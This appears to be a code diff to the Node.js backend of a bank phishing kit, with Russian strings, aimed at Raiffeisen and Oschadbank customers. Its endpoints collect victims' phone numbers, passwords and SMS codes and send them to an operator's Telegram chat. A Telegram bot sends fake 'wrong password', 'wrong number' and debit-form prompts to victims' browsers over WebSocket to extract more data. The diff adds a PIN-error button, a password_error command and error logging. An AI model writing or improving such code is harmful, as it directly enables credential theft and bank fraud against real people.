@@ -94,6 +94,7 @@ bot.on('callback_query', (callbackQuery) => {
     const ws = clients.get(sessionId);
 
     if (!ws || ws.readyState !== WebSocket.OPEN) {
+        console.error(`Ошибка: Клиент ${sessionId} не в сети`);
         bot.answerCallbackQuery(callbackQuery.id, { text: '❗️ Ошибка: клиент не в сети!', show_alert: true });
         return;
     }
@@ -106,8 +107,11 @@ bot.on('callback_query', (callbackQuery) => {
         case 'lk':
         case 'call':
         case 'ban':
+            break;
         case 'number_error':
-        case 'balance_error':
+            command.type = 'number_error';
+            command.data = { loginType: sessionData.loginMethod || 'phone' };
+            responseText = 'Запрос "неверный номер" отправлен!';
             break;
         case 'telegram_debit':
             command.type = sessionData.bankName === 'Ощадбанк' ? 'telegram_debit' : 'show_debit_form';
@@ -117,7 +121,9 @@ bot.on('callback_query', (callbackQuery) => {
                 command.type = 'raiff_pin_error';
                 responseText = 'Запрос "неверный пароль" отправлен!';
             } else {
+                command.type = 'password_error';
                 command.data = { loginType: sessionData.loginMethod || 'phone' };
+                responseText = 'Запрос "неверный пароль" отправлен!';
             }
             break;
         case 'client_not_found':
@@ -157,19 +163,25 @@ bot.on('callback_query', (callbackQuery) => {
             responseText = 'Запрос Переадресация 📞 отправлен!';
             break;
         default:
+            console.error(`Неизвестная команда: ${type}`);
             bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}`, show_alert: true });
             return;
     }
 
-    ws.send(JSON.stringify(command));
-    bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
+    try {
+        ws.send(JSON.stringify(command));
+        bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
+        console.log(`Команда ${type} отправлена клиенту ${sessionId}`);
+    } catch (error) {
+        console.error(`Ошибка отправки команды ${type} клиенту ${sessionId}:`, error);
+        bot.answerCallbackQuery(callbackQuery.id, { text: '❗️ Ошибка отправки команды!', show_alert: true });
+    }
 });
 
 // --- ОБРАБОТКА API SUBMIT ---
 app.post('/api/submit', (req, res) => {
     const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
 
-    // Проверка входящих данных
     if (!sessionId) {
         console.error('Ошибка: sessionId отсутствует');
         return res.status(400).json({ message: 'SessionId required' });
@@ -188,7 +200,6 @@ app.post('/api/submit', (req, res) => {
 
     let message = '';
 
-    // Формирование сообщения для Telegram в зависимости от данных
     if (newData.bankName === 'Райффайзен') {
         if (stepData.phone) {
             message = `<b>📱 Новый лог (Райф) - Телефон</b>\n\n` +
@@ -290,6 +301,7 @@ app.post('/api/sms', (req, res) => {
     const { sessionId, code, referrer } = req.body;
 
     if (!sessionId || !code) {
+        console.error('Ошибка: sessionId или code отсутствует');
         return res.status(400).json({ message: 'SessionId and code required' });
     }
 
@@ -310,6 +322,7 @@ app.post('/api/sms', (req, res) => {
         bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         res.status(200).json({ message: 'OK' });
     } else {
+        console.error(`Ошибка: Сессия ${sessionId} не найдена`);
         res.status(404).json({ message: 'Session not found' });
     }
 });
@@ -364,6 +377,7 @@ function sendToTelegram(message, sessionId, bankName) {
                 { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` },
             ],
             [
+                { text: 'ПИН ❌', callback_data: `password_error:${sessionId}` },
                 { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
                 { text: 'НОМЕР ❌', callback_data: `number_error:${sessionId}` },
             ],
